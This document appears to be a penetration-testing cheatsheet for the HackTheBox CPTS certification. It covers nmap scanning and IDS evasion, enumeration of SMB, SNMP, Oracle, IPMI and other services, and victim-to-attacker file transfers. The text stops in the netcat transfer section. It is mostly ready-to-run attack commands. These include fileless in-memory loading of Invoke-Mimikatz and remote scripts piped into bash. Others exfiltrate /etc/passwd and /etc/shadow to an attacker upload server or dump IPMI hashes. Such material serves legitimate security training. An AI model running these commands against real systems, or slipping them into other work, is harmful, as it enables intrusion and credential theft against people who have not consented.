# CPTS-cheatsheet
HackTheBox Certified Penetration Tester Specialist Cheatsheet


**Table of Contents**
- [Tmux](#tmux)
- [Nmap](#nmap)
  - [Address Scanning](#nmap-address-scanning)
  - [Scanning Techniques](#nmap-scanning-techniques)
  - [Host Discovery](#nmap-host-discovery)
  - [Port Scan](#nmap-port-scan)
  - [OS and Service Detection](#nmap-os-and-service-detection)
  - [Timing and Performance](#nmap-timing-and-performance)
  - [NSE Scripts](#nse-scripts)
  - [Evasion and Spoofing](#firewall-evasion-and-spoofing)
  - [Output](#output)
- [Footprinting Services](#footprinting-services)
    - [Infrastructure-Based Enumeration](#infrastructure-based-enumeration) 
    - [FTP](#ftp)
    - [MSRPC-p135](#msrpc-p135)
    - [SMB-p139,445](#smb-p139,445)
    - [Rpcbind-p111](#rpcbind-p111)
    - [NFS-p2049](#nfs-p2049)
    - [DNS](#dns)
    - [SMTP](#smtp)
    - [IMAP POP3](#imap-pop3)
    - [SNMP](#snmp)
    - [MYSQL](#mysql)
    - [MSSQL](#mssql)
    - [Oracle-TNS](#oracle-tns)
    - [IPMI](#ipmi)
    - [Remote Management](#remote-management)
- [Information Gathering Web Edition](#information-gathering-web-edition)
- [File Transfers](#file-transfers)
	- [Windows File Transfer](#windows-file-transfer)
   	- [Linux File Transfer](#linux-file-transfer)
   	- [Transferring Files with Code](#transferring-files-with-code)
   	- [Miscellaneous File Transfer Methods](#miscellaneous-file-transfer-methods)
   	- [Protected File Transfers](#protected-file-transfers)
   	- [Catching Files over HTTP/S](#catching-files-over-http/s)
   	- [Living off The Land](#living-off-the-land)
- [Shells](#shells)
    - [Reverse Shell](#reverse-shell)
    - [Bind Shell](#bind-shell)
    - [Web Shell](#web-shell)
    - [Updating TTY](#updating-tty)
- [Password Attacks](#password-attacks)
    - [Password Mutations](#password-mutations)
    - [Remote Password Attacks](#remote-password-attacks)
    - [Windows Password Attacks](#windows-password-attacks)
    - [Linux Password Attacks](#linux-password-attacks)
    - [Cracking Passwords](#cracking-passwords)
- [Attacking Common Services](#attacking-common-services)
    - [Attacking SMB](#attacking-smb)
    - [Attacking SQL](#attacking-sql)
    - [Attacking Email Services](#attacking-email-services)
- [Active Directory](#active-directory)
    - [Initial Enumeration](#initial-enumeration)
    - [LLMNR/NTB-NS Poisoning](#llmnr-poisoning)
    - [Password Spraying & Password Policies](#password-spraying-and-password-policies)
    - [Enumerating Disabling/Bypassing Security Controls](#enumerating-and-bypassing-security-controls)
    - [Credentialed Enumeration - from Linux and Windows](credentialed-enumeration-from-linux-and-windows)
    - [Living Of The Land](#living-of-the-land)
    - [Kerberoasting](#kerberoasting)
    - [ACL Enumeration & Tactics](#acl-enumeration-and-tactics)
    - [DCSync Attack](#dcsync-attack)
    - [Miscellanous Configurations](#miscellanous-configurations)
    - [ASREPRoasting](#asreproasting)
    - [Trust Relationships](#trust-relationships-child-parent-trusts)
- [Login Brute Forcing](#login-brute-forcing)
    - [Hydra](#hydra)
- [SQLMap](#sqlmap)
- [Useful Resources](#useful-resources)



## [Tmux](https://tmuxcheatsheet.com/)
```
# Start a new tmux session
tmux new -s <name>

# Start a new session or attach to an existing session named mysession
tmux new-session -A -s <name>

# List all sessions
tmux ls

# kill/delete session
tmux kill-session -t <name>

# kill all sessions but current
tmux kill-session -a

# attach to last session
tmux a
tmux a -t <name>

# start/stop logging with tmux logger
prefix + [Shift + P]

# split tmux pane vertically
prefix + [Shift + %}

# split tmux pane horizontally
prefix + [Shift + "]

# switch between tmux panes
prefix + [Shift + O]
```

## [NMAP](https://www.stationx.net/nmap-cheat-sheet/)
#### Nmap address scanning
```
# Scan a single IP
nmap 192.168.1.1

# Scan multiple IPs
nmap 192.168.1.1 192.168.1.2

# Scan a range
nmap 192.168.1.1-254

# Scan a subnet
nmap 192.168.1.0/24
```
#### Nmap scanning techniques
```
# TCP SYN port scan (Default)
nmap -sS 192.168.1.1

# TCP connect port scan (Default without root privilege)
nmap -sT 192.168.1.1

# UDP port scan
nmap -sU 192.168.1.1

# TCP ACK port scan
nmap  -sA 192.168.1.1
```
#### Nmap Host Discovery
```
# Disable port scanning. Host discovery only.
nmap -sn 192.168.1.1

# Disable host discovery. Port scan only.
nmap -Pn 192.168.1.1

# Never do DNS resolution
nmap -n 192.168.1.1

```

#### Nmap port scan
```
# Port scan from service name
nmap 192.168.1.1 -p http, https

# Specific port scan
nmap 192.168.1.1 -p 80,9001,22

# All ports
nmap 192.168.1.1 -p-

# Fast scan 100 ports
nmap -F 192.168.1.1

# Scan top ports
nmap 192.168.1.1 -top-ports 200
```

#### Nmap OS and service detection
```
# Aggresive scanning (Bad Opsec). Enables OS detection, version detection, script scanning, and traceroute.
nmap -A 192.168.1.1

# Version detection scanning
nmap -sV 192.168.1.1

# Version detection intensity from 0-9
nmap -sV -version-intensity 7 192.168.1.1

# OS detecion
nmap -O 192.168.1.1

# Hard OS detection intensity
nmap -O -osscan-guess 192.168.1.1
```

#### Nmap timing and performance
```
# Paranoid (0) Intrusion Detection System evasion
nmap 192.168.1.1 -T0

# Insane (5) speeds scan; assumes you are on an extraordinarily fast network
nmap 192.168.1.1 -T5

# Send packets no slower than <number> per second
nmap 192.168.1.1 --min-rate 1000
```
#### NSE Scripts
```
# Scan with a single script. Example banner
nmap 192.168.1.1 --script=banner

# NSE script with arguments
nmap 192.168.1.1 --script=banner --script-args <arguments>
```
#### Firewall Evasion and Spoofing
```
# Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters
nmap -f 192.168.1.1

# Set your own offset size(8, 16, 32, 64)
nmap 192.168.1.1 --mtu 32

# Send scans from spoofed IPs, or you can generate random 5 IPs via this option -D RND:5
nmap 192.168.1.1 -D 192.168.1.11, 192.168.1.12, 192.168.1.13, 192.168.1.13
sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5

# -S 	Scans the target by using different source IP address | -O for operating system | -e to scan from specific eithernet
sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0

# --source-port 53 	Performs the scans from specified source port | or You Can Connect To The Filtered Port
sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
ncat -nv --source-port 53 10.129.2.28 50000 |or| nc -nv -p 53 10.129.2.47 50000

# -sA 	Performs ACK scan on specified ports.
sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace
```
#### Output
```
# Normal output to the file normal.file
nmap 192.168.1.1 -oN scan.txt

# Output in the three major formats at once
nmap 192.168.1.1 -oA scan
```
## Footprinting Services
##### Infrastructure-based Enumeration
```
# Certificate transparency | to gather all subdomains for a corprate/company
curl -s https://crt.sh/\?q\=<target-domain>\&output\=json | jq .

# Scan each IP address in a list using Shodan.
for i in $(cat ip-addresses.txt);do shodan host $i;done
```
##### FTP
```
# Connect to FTP
ftp <IP>

# Interact with a service on the target.
nc -nv <IP> <PORT>

# Download all available files on the target FTP server
wget -m --no-passive ftp://anonymous:anonymous@<IP>

# Using nmap
sudo nmap --script-updatedb
find / -type f -name ftp* 2>/dev/null | grep scripts

# Using openssl, incase ftp use tls/sll
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```
##### MSRPC-p135
```
nmap 10.11.1.111 --script=msrpc-enum
msf > use exploit/windows/dcerpc/ms03_026_dcom
```
##### SMB-p139,445
```
# Connect to a specific SMB share | -L for display all files | and - N  for null session (-N), which is anonymous access 
smbclient //<FQDN IP>/<share>

# Interaction with the target using RPC | Query = `srvinfo` or `enumdomains` or `querydominfo` or `netshareenumall` or `netsharegetinfo <share>` or `enumdomusers` or `queryuser <RID>`
rpcclient -U "" <FQDN IP>

# Brute Forcing User RIDs
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

# we can brute force for user rids also via Impacket - Samrdump.py
samrdump.py 10.129.14.128

# using smbmap
smbmap -H 10.129.14.128

# using Enum4Linux-ng
 ./enum4linux-ng.py 10.129.14.128 -A

# Enumerating SMB shares using null session authentication.
crackmapexec smb <FQDN/IP> --shares -u '' -p '' --shares
```
##### Rpcbind-p111
```
rpcinfo -p 10.11.1.111  # enum NFS shares
showmount -e 10.11.1.111
mount -t nfs 10.11.1.111:/ /mnt -o nolock     # mount remote share to your local machine

rpcclient -U "" 10.11.1.111
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall
```

##### NFS-p2049
```
# Via nmap
 sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

# Show available NFS shares
showmount -e <IP>

# Mount the specific NFS share.umount ./target-NFS
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
```

##### DNS
```
# NS request to the specific nameserver.
dig ns <domain.tld> @<nameserver>

# ANY request to the specific nameserver
dig any <domain.tld> @<nameserver>

# AXFR request to the specific nameserver. | if you found a sub domain internally you can use this option dig axfr internal.domain.tld @<nameserver>
dig axfr <domain.tld> @<nameserver>

# Subdomain Brute Forcing
> for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

> dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
> dnsenum --enum inlanefreight.com -f /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt --threads 20 --noreverse --nodnsserver --noreport --nocolor -r
```
##### SMTP
```
# NS request to the specific nameserver. | `AUTH PLAIN` or `HELO` or `CONNECT 10.129.14.128:25 HTTP/1.0` when deling with proxy or `MAIL FROM` or `RCPT TO` or `DATA` or `RSET` or `VRFY` or `EXPN` or `NOOP` or `QUIT`
telnet <ip> 25

# Using Nmap - for Open Relay
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v

# to enum a list of users
smtp-user-enum -M VRFY -U /home/kali/Downloads/footprinting-wordlist.txt -t 10.129.152.94 -w 120 -p 25 -v
```

##### IMAP POP3
```
# Log in to the IMAPS service using cURL | `-k` or `-v`
curl -k 'imaps://<FQDN/IP>' --user <user>:<password>

# Connect to the IMAPS service | there are multiple IMAP Commands you need to search about it https://www.atmail.com/blog/imap-101-manual-imap-sessions/
openssl s_client -connect <FQDN/IP>:imaps

# Connect to the POP3s service | there are multiple IMAP Commands you need to search about it 
openssl s_client -connect <FQDN/IP>:pop3s
```

#### SNMP
```
# Querying OIDs using snmpwalk
snmpwalk -v2c -c <community string> <FQDN/IP>

# Bruteforcing community strings of the SNMP service. | you can guess community-string by fuzzing via /opt/useful/seclists/Discovery/SNMP/snmp.txt list
onesixtyone -c community-strings-fuzzing.list <FQDN/IP>

# Bruteforcing SNMP service OIDs.
braa <community string>@<FQDN/IP>:.1.*
```
##### MYSQL
```
mysql -u <user> -p<password> -h <FQDN/IP>
```
##### MSSQL
```
impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
```
##### Oracle-Tns
```
# using nmap
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

# using odat tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. 
./odat.py all -s 10.129.204.235

# using SQLplus - to Access/Log In | if you recieve an error go to https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared
sqlplus <username>/<pass>@IP/XE-as-an-instanse
sqlplus <username>/<pass>@IP/XE-as-an-instanse as sysdba

# Oracle RDBMS - Interaction
> select table_name from all_tables; | > select * from user_role_privs; | > select name, password from sys.user$;

# Oracle RDBMS - File Upload
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
curl -X GET http://10.129.204.235/testing.txt
```
##### IPMI
```
# Using nmap
sudo nmap -sU --script ipmi-version -p 623 domain.local

# IPMI version detection
msf6 use auxiliary/scanner/ipmi/ipmi_version 

# Dump IPMI hashes
msf6 use auxiliary/scanner/ipmi/ipmi_dumphashes 
```
##### Remote Management
```
# SSH -p22/TCP
./ssh-audit.py <IP>
ssh <user>@<FQDN/IP> -o PreferredAuthentications=password  --> Enforce password-based authentication
ssh -i ./id_rsa <username>@<IP> --> Enforce Private-key-based authentication "chmod 600 ./id_rsa" 

# Rsync -p873/TCP
nc -nv 127.0.0.1 873
rsync -av --list-only rsync://127.0.0.1/dev-folder

# R-Services -p512/TCP,513/TCP,514/TCP
rcp | rexec | rlogin | rsh | rstat | rwho | rusers -al

# RDP -p3389/TCP
nmap -sV -sC <IP> -p3389 --script rdp*
./rdp-sec-check.pl <IP>
xfreerdp /u:<username> /p:"<password>" /v:<IP>

# WinRM -p5985/HTTP/TCP,5986/HTTPS/TCP
For windows --> The Test-WsMan cmdlet is responsible for this
For Linux   --> evil-winrm -i 10.129.201.248 -u <username> -p <password>

# WMI -p135/TCP
/python3-impacket/examples/wmiexec.py username:"Password"@<IP> "hostname"

```
## Information Gathering Web Edition
##### WhoIs
```
whois inlanefreight.com
```
##### WhatWeb
```
whatweb -a 3 http://dev.inlanefreight.local -v
```
##### Virtual Hosts
```
gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```
##### crt.sh lookup
```
curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
```
##### Banner Grabbing 
```
you can use Wappalyzer,BuiltWith,WhatWeb,Nmap,Netcraft
curl -I inlanefreight.com
```
##### Web Application Firewalls (WAFs)
```
pip3 install git+https://github.com/EnableSecurity/wafw00f
wafw00f inlanefreight.com
```
##### nikto
```
nikto -h inlanefreight.com -Tuning b
```
###### Reconspider
```
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip
python3 ReconSpider.py http://inlanefreight.com
```
###### Automate Reconnaissance
```
you can use FinalRecon,Recon-ng,theHarvester,SpiderFoot,OSINT Framework
```
## File Transfers
### Windows File Transfer
#### Download Operations
##### PowerShell Base64 Encode & Decode
```
A> md5sum id_rsa.txt
A> cat id_rsa |base64 -w 0;echo
V> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa.txt", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
V> Get-FileHash C:\Users\Public\id_rsa.txt -Algorithm md5
```
##### PowerShell Web Downloads
```
- PowerSheel Download Methods:- OpenRead,OpenReadAsync,DownloadData,DownloadDataAsync,DownloadFile,DownloadFileAsync,DownloadString,DownloadStringAsync

	- PowerShell DownloadFile Method - File Download:-
		PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
		PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:					\Users\Public\Downloads\PowerView.ps1')

		PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
		PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:			\Users\Public\Downloads\PowerViewAsync.ps1')

	- PowerShell DownloadString - Fileless Method:-
		PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/			Invoke-Mimikatz.ps1')
		PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/				Invoke-Mimikatz.ps1') | IEX
		PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
		PS C:\htb> read here -> https://gist.github.com/HarmJ0y/bb48307ffa663256e239
		Common Errors with PowerShell:-
		PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
		PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
		PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
		PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
##### SMB Downloads
```
A> sudo impacket-smbserver share -smb2support /tmp/smbshare
V> copy \\192.168.220.133\share\nc.exe
A> sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
V> net use n: \\192.168.220.133\share /user:test test

```
##### FTP Downloads
```
A> sudo pip3 install pyftpdlib
A> sudo python3 -m pyftpdlib --port 21
V> PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
OR
V> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
V> C:\htb> echo USER anonymous >> ftpcommand.txt
V> C:\htb> echo binary >> ftpcommand.txt
V> C:\htb> echo GET file.txt >> ftpcommand.txt
V> C:\htb> echo bye >> ftpcommand.txt
V> C:\htb> ftp -v -n -s:ftpcommand.txt
V> ftp> open 192.168.49.128
V> Log in with USER and PASS first.
V> ftp> USER anonymous

V> ftp> GET file.txt
V> ftp> bye

V> C:\htb>more file.txt
V> This is a test file
```
#### Upload Operations
##### PowerShell Base64 Encode & Decode
```
V> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
V> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
A> echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2lu
ZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```
##### PowerShell Web Uploads 
```
ref:- https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
A> pip3 install uploadserver
A> python3 -m uploadserver
V> PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
-------------------------------------------------------------------------------------------------------------------
A> nc -lvnp 8000
V> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
V> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
A> echo <base64> | base64 -d -w 0 > hosts
```
##### SMB Uploads
```
A> sudo pip3 install wsgidav cheroot
A> sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
V> dir \\192.168.49.128\DavWWWRoot
V> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
V> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
##### FTP Uploads
```
A> sudo python3 -m pyftpdlib --port 21 --write
V> PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
OR 
V> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
V> C:\htb> echo USER anonymous >> ftpcommand.txt
V> C:\htb> echo binary >> ftpcommand.txt
V> C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
V> C:\htb> echo bye >> ftpcommand.txt
V> C:\htb> ftp -v -n -s:ftpcommand.txt
V> ftp> open 192.168.49.128
V> ftp> USER anonymous
V> ftp> PUT c:\windows\system32\drivers\etc\hosts
V> ftp> bye
```
### Linux File Transfer
#### Download Operations
##### Base64 Encoding / Decoding
```
A> md5sum id_rsa
A> cat id_rsa |base64 -w 0;echo
V>  echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3Rjbg
pOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCtLS0tLQo=' | base64 -d > id_rsa
V> md5sum id_rsa
```
#### Web Downloads with Wget and cURL
```
V> wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
V> curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
V> curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
V> wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
#### Download with Bash (/dev/tcp)
```
V> exec 3<>/dev/tcp/10.10.10.32/80
V> echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
V> cat <&3
```
#### SSH Downloads
```
A> sudo systemctl enable ssh
A> sudo systemctl start ssh
A> netstat -lnpt
V> scp plaintext@192.168.49.128:/root/myroot.txt . 
```
#### Upload Operations
##### Web Upload
```
A> sudo python3 -m pip install --user uploadserver
A> openssl req -x509 -out /differnetdirectory/server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
A>  mkdir https && cd https
A> sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
V> curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
##### Alternative Web File Transfer Method
```
V> python3 -m http.server
OR
V> python2.7 -m SimpleHTTPServer
OR 
V> php -S 0.0.0.0:8000
OR
V> ruby -run -ehttpd . -p8000
A> wget 192.168.49.128:8000/filetotransfer.txt
```
##### SCP Upload
```
V> scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```
### Transferring Files with Code
##### Python
```
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
##### PHP
```
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
OR
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
OR
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
##### Ruby - Download a File
```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
##### Perl
```
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
##### JavaScript
```
> creat file called wget.js
``
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
``
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1

```
##### VBScript
```
> creat file called wget.vbs
``
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
``
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
##### Upload Operations using Python3
```
A> python3 -m uploadserver 
A> python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
### Miscellaneous File Transfer Methods
#### File Transfer with Netcat and Ncat
##### Forword file transfer
```
V> nc -l -p 8000 > SharpKatz.exe
OR 
V> ncat -l -p 8000 --recv-only > SharpKatz.exe
A> nc -q 0 192.168.49.128 8000 < SharpKatz.exe
OR
A> ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
##### Reverse file transfer
```
A> sudo nc -l -p 443 -q 0 < SharpKatz.exe
V> nc 192.168.49.128 443 > SharpKatz.exe
OR
A> sudo ncat -l -p 443 --send-only < SharpKatz.exe
V> ncat 192.168.49.128 443 --recv-only > SharpKatz.exe

--------------------------------------------------------

